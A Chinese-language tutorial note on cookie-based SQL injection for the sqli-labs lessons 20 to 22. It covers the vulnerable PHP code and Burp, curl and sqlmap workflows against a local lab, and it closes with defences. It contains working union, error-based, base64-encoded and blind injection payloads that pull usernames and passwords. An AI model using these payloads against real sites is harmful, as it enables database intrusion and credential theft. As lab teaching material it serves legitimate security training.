# 01-Cookie 注入

> 前置：[[../SQL总目录|SQL 总目录]] 基础章节（union 联合查询、报错注入）
>
> sqli-labs 对照：less-20（明文 Cookie 回显）、less-21（Cookie base64 + 单引号闭合）、less-22（Cookie base64 + 双引号闭合）

## 一、原理：Cookie 也是输入源

很多教程只强调 GET/POST 参数要过滤，却忘了 PHP 中 `$_COOKIE` 与 `$_GET`、`$_POST` 同为用户可控输入——**浏览器里的 Cookie 完全由客户端决定**，服务端直接拼接进 SQL 就是注入点。

漏洞代码形态（less-20 原型）：

```php
// 登录成功后从 Cookie 取用户名直接查库
$uname = $_COOKIE['uname'];
$sql = "SELECT username, password FROM users WHERE username='$uname' LIMIT 0,1";
$result = mysql_query($sql);
```

正常请求 `Cookie: uname=admin` 执行：

```sql
SELECT username, password FROM users WHERE username='admin' LIMIT 0,1
```

攻击者把 Cookie 改成 `admin' and '1'='1`，SQL 即被改写。**Cookie 注入与 GET 注入的 payload 完全通用，区别只在数据到达的位置。**

## 二、Burp 抓包改 Cookie 流程（less-20）

1. 浏览器登录靶场，Burp 开启拦截，刷新页面拿到带 `Cookie: uname=admin` 的请求
2. 右键 Send to Repeater
3. 在 Repeater 中修改 uname 值测试注入
4. 观察响应中的回显位（页面会显示 username/password 字段内容）

判断闭合方式：

| 测试值 | 现象 | 结论 |
|--------|------|------|
| `admin'` | MySQL 报错信息可见 | 单引号闭合，有报错回显 |
| `admin' or '1'='1` | 返回全部/第一条用户 | 单引号闭合确认 |
| `admin"` | 报错 | 双引号闭合（less-22） |

确定列数与回显位后走 union 标准流程：

```sql
-- 列数探测（users 表查询为 3 列）
uname=admin' order by 3#
uname=admin' order by 4#        -- 报错，说明 3 列

-- 回显位 + 提数据
uname=-1' union select 1,database(),3#
uname=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#
uname=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'#
uname=-1' union select 1,group_concat(username,0x3a,password),3 from users#
```

less-20 的完整请求示例（Burp Repeater 中）：

```http
GET /Less-20/index.php HTTP/1.1
Host: 127.0.0.1
Cookie: uname=admin' and updatexml(1,concat(0x7e,database()),1)#
Connection: close
```

## 三、base64 编码 Cookie 注入（less-21 / less-22）

### 代码差异

less-21 的关键代码：Cookie 值先 base64 解码再拼 SQL：

```php
$cookee = base64_decode($_COOKIE['uname']);
$sql = "SELECT username, password FROM users WHERE username='$cookee' LIMIT 0,1";
```

所以**注入 payload 必须先写好、再整体 base64 编码后放进 Cookie**。流程三步：解码看清逻辑 → 明文构造 payload → 编码回传。

### 为什么要先解码

拿到一个可疑站点时，先把自己 Cookie 里的值丢进解码器看一眼：

```bash
echo "YWRtaW4=" | base64 -d
# admin ← 说明服务端按 base64 解码后再处理，注入也要编码后发送
```

若不解码直接发 payload，服务端 base64_decode 后得到乱码，SQL 里只是普通字符串，注入无效。**判断"编码型注入点"的第一步永远是先解码现有值。**

### less-21 操作示例

```bash
# 目标 payload（单引号闭合）:
admin') and updatexml(1,concat(0x7e,(select database())),1)#

# 注意: 服务端解码后的值会再经过一层处理时可能吃掉特殊字符，
# less-21 实际是 ') 闭合，payload:
admin') and extractvalue(1,concat(0x7e,database())) and ('1')=('1

# base64 编码（linux 命令行）:
echo -n "admin') and extractvalue(1,concat(0x7e,database()))#" | base64
# YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsZGF0YWJhc2UoKSkpIw==
```

发出去的请求头：

```http
GET /Less-21/index.php HTTP/1.1
Host: 靶场地址
Cookie: uname=YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsZGF0YWJhc2UoKSkpIw==
```

### less-22 差异

双引号闭合，payload 改为：

```
admin" and extractvalue(1,concat(0x7e,database()))#
```

编码方式相同。

### 易错点

| 易错点 | 说明 |
|-------|------|
| 编码前忘加换行处理 | `base64` 默认每 76 字符换行，长 payload 用 `echo -n ... \| base64 -w 0` |
| URL 编码叠加 | base64 中的 `+/=` 在部分环境会被转义，必要时再做一层 URL 编码 |
| 直接在 Burp 里改明文 | less-21/22 不接受明文，必须整串 base64 |
| # 注释符被截断 | Cookie 值里 `#` 一般安全，但若走 URL 参数需写成 `%23` |

## 四、报错注入配合

Cookie 场景通常**没有直接的 union 回显位**（页面只显示登录信息），报错注入是最稳的提数据手段：

```sql
' and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)),1)#
' and extractvalue(1,concat(0x7e,(select database()),0x7e))#
```

extractvalue/updatexml 只回显约 32 字符，超长用 substr 分段：

```sql
' and extractvalue(1,concat(0x7e,substr((select group_concat(username,0x3a,password) from users),1,30)))#
' and extractvalue(1,concat(0x7e,substr((select group_concat(username,0x3a,password) from users),31,30)))#
```

无报错回显时退化为盲注（Cookie 场景同样适用）：

```sql
-- 布尔盲注: 通过页面是否正常区分真假
' and ascii(substr(database(),1,1))=115 and '1'='1
-- 时间盲注: 响应延迟约 5 秒即条件为真
' and if(ascii(substr(database(),1,1))=115,sleep(5),0)#
```

## 六、curl 命令行测试示例

不用 Burp 也能完整复现，`curl -b` 直接指定 Cookie：

```bash
# less-20: 明文 Cookie 注入
curl -s "http://127.0.0.1/sqli-labs/Less-20/index.php" \
     -b "uname=admin' and updatexml(1,concat(0x7e,database()),1)#"

# less-21: 先本地编码再发送
PAYLOAD=$(echo -n "admin') and extractvalue(1,concat(0x7e,database()))#" | base64 -w 0)
curl -s "http://127.0.0.1/sqli-labs/Less-21/index.php" \
     -b "uname=${PAYLOAD}"

# less-22: 双引号闭合版
PAYLOAD=$(echo -n 'admin" and extractvalue(1,concat(0x7e,database()))#' | base64 -w 0)
curl -s "http://127.0.0.1/sqli-labs/Less-22/index.php" \
     -b "uname=${PAYLOAD}"

# 配合 sqlmap（cookie 作为注入点）
sqlmap -u "http://127.0.0.1/sqli-labs/Less-21/index.php" \
       --cookie="uname=YWRtaW4=" --dbms=mysql --batch
```

## 六、防御

| 措施 | 说明 |
|------|------|
| 参数化查询 | Cookie 值同样走 prepared statement，与 GET/POST 同等待遇 |
| 不要信任任何输入 | `$_COOKIE` 与 `$_GET` 在白名单校验上不应有差别 |
| 最小化 Cookie 用途 | 身份标识尽量只存 session id，业务数据留在服务端 session |
| HttpOnly 不是解药 | HttpOnly 只防 JS 读 Cookie，不防抓包改包注入 |
| 关闭详细报错 | `display_errors=Off`，报错注入失去出口 |

---
**返回** [[mysql结构总目录|mysql结构 总目录]]
